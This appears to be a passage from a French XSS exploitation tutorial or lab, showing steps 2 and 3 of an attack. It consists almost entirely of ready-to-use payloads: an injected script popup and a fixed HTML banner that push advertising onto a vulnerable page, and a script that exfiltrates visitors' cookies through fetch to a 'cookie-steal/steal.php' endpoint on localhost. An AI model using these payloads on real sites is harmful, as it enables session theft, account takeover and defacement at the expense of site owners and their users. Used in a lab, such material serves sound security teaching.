## Étape 2 : Exploitation des vulnérabilités XSS pour afficher publicité

```js
// Payload 1 - Popup publicitaire :
<script>alert('🎉 PROMO EXCEPTIONNELLE ! -50% sur tous les produits ! Cliquez OK pour en profiter !');</script>

// Payload 2 - Bannière publicitaire :
<div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;z-index:9999;padding:10px;">🔥 OFFRE LIMITÉE ! Visitez www.promo-site.com 🔥</div>
```
## Étape 3 : Exploitation des vulnérabilités XSS pour voler des cookies
```js
// Payload 2 - Envoi vers serveur malveillant :
<script>fetch('http://localhost/cookie-steal/steal.php?cookie=' + encodeURIComponent(document.cookie));</script>
```
